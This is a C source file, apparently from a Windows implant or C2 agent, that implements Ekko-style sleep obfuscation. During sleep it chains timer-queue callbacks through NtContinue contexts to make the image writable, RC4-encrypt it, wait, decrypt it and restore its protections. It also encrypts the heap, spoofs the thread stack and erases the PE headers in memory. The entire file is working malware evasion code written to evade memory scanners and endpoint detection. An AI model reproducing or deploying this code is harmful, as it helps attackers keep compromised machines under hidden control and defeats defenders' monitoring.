#include "SleepObf.h"
#include "Syscalls.h"
#include "ProcLoader.h"
#include "utils.h"
#include "ntdll.h"
#include "CallSpoof.h"
#include "HeapCrypt.h"

typedef NTSTATUS (WINAPI *fnSystemFunction032)(USTRING* data, USTRING* key);

PVOID  g_ImageBase = NULL;
SIZE_T g_ImageSize = 0;
PVOID  g_DataSectionBase = NULL;
SIZE_T g_DataSectionSize = 0;

void SaveImageInfo()
{
#ifdef __x86_64__
    PEB* peb = (PEB*)__readgsqword(0x60);
#else
    PEB* peb = (PEB*)__readfsdword(0x30);
#endif
    PVOID imageBase = peb->ImageBaseAddress;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dos->e_lfanew);

    g_ImageBase = imageBase;
    g_ImageSize = nt->OptionalHeader.SizeOfImage;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PVOID dataStart = NULL;
    PVOID dataEnd   = NULL;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            PVOID secBase = (BYTE*)imageBase + sec[i].VirtualAddress;
            SIZE_T secSize = (sec[i].Misc.VirtualSize + 0xFFF) & ~0xFFF;
            PVOID secEnd  = (BYTE*)secBase + secSize;

            if (!dataStart || secBase < dataStart)
                dataStart = secBase;
            if (!dataEnd || secEnd > dataEnd)
                dataEnd = secEnd;
        }
    }

    if (dataStart && dataEnd) {
        g_DataSectionBase = dataStart;
        g_DataSectionSize = (SIZE_T)((BYTE*)dataEnd - (BYTE*)dataStart);
    }
}

void StompPEHeaders()
{
    if (!g_ImageBase)
        return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ImageBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)g_ImageBase + dos->e_lfanew);
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;

    DWORD oldProtect;
    ApiWin->VirtualProtect(g_ImageBase, headerSize, PAGE_READWRITE, &oldProtect);
    memset(g_ImageBase, 0, headerSize);
    ApiWin->VirtualProtect(g_ImageBase, headerSize, oldProtect, &oldProtect);
}

#ifdef __x86_64__

BOOL EkkoSleep(ULONG sleepMs)
{
    if (!ApiWin->CreateTimerQueue || !ApiWin->CreateTimerQueueTimer ||
        !ApiWin->DeleteTimerQueue || !ApiWin->VirtualProtect ||
        !ApiWin->SystemFunction032 || !ApiNt->NtContinue ||
        !ApiWin->RtlCaptureContext)
        return FALSE;

    PVOID  imageBase = g_ImageBase;
    SIZE_T imageSize = g_ImageSize;
    if (!imageBase || !imageSize)
        return FALSE;

    HANDLE hEvent = ApiWin->CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!hEvent)
        return FALSE;

    HANDLE hTimerQueue = ApiWin->CreateTimerQueue();
    if (!hTimerQueue) {
        SysNtClose(hEvent);
        return FALSE;
    }

    BYTE keyBuf[16];
    for (int i = 0; i < 16; i++)
        keyBuf[i] = (BYTE)(GenerateRandom32() & 0xFF);

    USTRING key = { 16, 16, keyBuf };
    USTRING img = { 0, 0, NULL };
    img.Length        = (DWORD)imageSize;
    img.MaximumLength = (DWORD)imageSize;
    img.Buffer        = imageBase;

    DWORD  oldProtect = 0;
    DWORD  oldProtect2 = 0;
    HANDLE hNewTimer  = NULL;

    CONTEXT ctxThread = { 0 };
    ctxThread.ContextFlags = CONTEXT_FULL;

    BOOL ok = ApiWin->CreateTimerQueueTimer(
        &hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)ApiWin->RtlCaptureContext,
        &ctxThread, 0, 0, WT_EXECUTEINTIMERTHREAD
    );
    if (!ok) {
        ApiWin->DeleteTimerQueue(hTimerQueue);
        SysNtClose(hEvent);
        return FALSE;
    }

    LARGE_INTEGER liTimeout;
    liTimeout.QuadPart = -500000LL;
    SysNtWaitForSingleObject(hEvent, FALSE, &liTimeout);

    if (ctxThread.Rip == 0) {
        ApiWin->DeleteTimerQueue(hTimerQueue);
        SysNtClose(hEvent);
        return FALSE;
    }

    CONTEXT ropProtRW  = { 0 };
    CONTEXT ropEncrypt = { 0 };
    CONTEXT ropDelay   = { 0 };
    CONTEXT ropDecrypt = { 0 };
    CONTEXT ropProtRX  = { 0 };
    CONTEXT ropProtData = { 0 };
    CONTEXT ropSetEvt  = { 0 };

    memcpy(&ropProtRW,   &ctxThread, sizeof(CONTEXT));
    memcpy(&ropEncrypt,  &ctxThread, sizeof(CONTEXT));
    memcpy(&ropDelay,    &ctxThread, sizeof(CONTEXT));
    memcpy(&ropDecrypt,  &ctxThread, sizeof(CONTEXT));
    memcpy(&ropProtRX,   &ctxThread, sizeof(CONTEXT));
    memcpy(&ropProtData, &ctxThread, sizeof(CONTEXT));
    memcpy(&ropSetEvt,   &ctxThread, sizeof(CONTEXT));

    // VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect)
    ropProtRW.Rsp -= 8;
    ropProtRW.Rip  = (DWORD64)ApiWin->VirtualProtect;
    ropProtRW.Rcx  = (DWORD64)imageBase;
    ropProtRW.Rdx  = (DWORD64)imageSize;
    ropProtRW.R8   = PAGE_READWRITE;
    ropProtRW.R9   = (DWORD64)&oldProtect;

    // SystemFunction032(&img, &key) — encrypt
    ropEncrypt.Rsp -= 8;
    ropEncrypt.Rip  = (DWORD64)(fnSystemFunction032)ApiWin->SystemFunction032;
    ropEncrypt.Rcx  = (DWORD64)&img;
    ropEncrypt.Rdx  = (DWORD64)&key;

    // WaitForSingleObject(hEvent, sleepMs) — actual sleep
    ropDelay.Rsp -= 8;
    ropDelay.Rip  = (DWORD64)ApiWin->WaitForSingleObject;
    ropDelay.Rcx  = (DWORD64)hEvent;
    ropDelay.Rdx  = (DWORD64)sleepMs;

    // SystemFunction032(&img, &key) — decrypt (XOR is symmetric)
    ropDecrypt.Rsp -= 8;
    ropDecrypt.Rip  = (DWORD64)(fnSystemFunction032)ApiWin->SystemFunction032;
    ropDecrypt.Rcx  = (DWORD64)&img;
    ropDecrypt.Rdx  = (DWORD64)&key;

    // VirtualProtect(imageBase, imageSize, PAGE_EXECUTE_READ, &oldProtect)
    ropProtRX.Rsp -= 8;
    ropProtRX.Rip  = (DWORD64)ApiWin->VirtualProtect;
    ropProtRX.Rcx  = (DWORD64)imageBase;
    ropProtRX.Rdx  = (DWORD64)imageSize;
    ropProtRX.R8   = PAGE_EXECUTE_READ;
    ropProtRX.R9   = (DWORD64)&oldProtect;

    // VirtualProtect(dataSectionBase, dataSectionSize, PAGE_READWRITE, &oldProtect2)
    ropProtData.Rsp -= 8;
    ropProtData.Rip  = (DWORD64)ApiWin->VirtualProtect;
    ropProtData.Rcx  = (DWORD64)g_DataSectionBase;
    ropProtData.Rdx  = (DWORD64)g_DataSectionSize;
    ropProtData.R8   = PAGE_READWRITE;
    ropProtData.R9   = (DWORD64)&oldProtect2;

    // SetEvent(hEvent) — signal completion
    ropSetEvt.Rsp -= 8;
    ropSetEvt.Rip  = (DWORD64)ApiWin->SetEvent;
    ropSetEvt.Rcx  = (DWORD64)hEvent;

    HeapEncryptAll();
    SpoofThreadStack(imageBase, imageSize);

    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropProtRW,   100, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropEncrypt,  200, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropDelay,    300, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropDecrypt,  400, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropProtRX,   500, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropProtData, 600, 0, WT_EXECUTEINTIMERTHREAD);
    ApiWin->CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ApiNt->NtContinue, &ropSetEvt,   700, 0, WT_EXECUTEINTIMERTHREAD);

    ApiWin->WaitForSingleObject(hEvent, INFINITE);

    RestoreThreadStack();
    HeapDecryptAll();

    ApiWin->DeleteTimerQueue(hTimerQueue);
    SysNtClose(hEvent);
    return TRUE;
}

void ObfSleep(ULONG ms)
{
    if (!EkkoSleep(ms))
        ApiWin->Sleep(ms);
}

void ObfSleepWithEvent(HANDLE hEvent, ULONG ms)
{
    if (hEvent) {
        DWORD waitResult = ApiWin->WaitForSingleObject(hEvent, ms);
        if (waitResult == WAIT_OBJECT_0)
            ApiWin->ResetEvent(hEvent);
    }
    else {
        ObfSleep(ms);
    }
}

#else

void ObfSleep(ULONG ms)
{
    ApiWin->Sleep(ms);
}

void ObfSleepWithEvent(HANDLE hEvent, ULONG ms)
{
    if (hEvent) {
        DWORD waitResult = ApiWin->WaitForSingleObject(hEvent, ms);
        if (waitResult == WAIT_OBJECT_0)
            ApiWin->ResetEvent(hEvent);
    }
    else {
        ApiWin->Sleep(ms);
    }
}

#endif
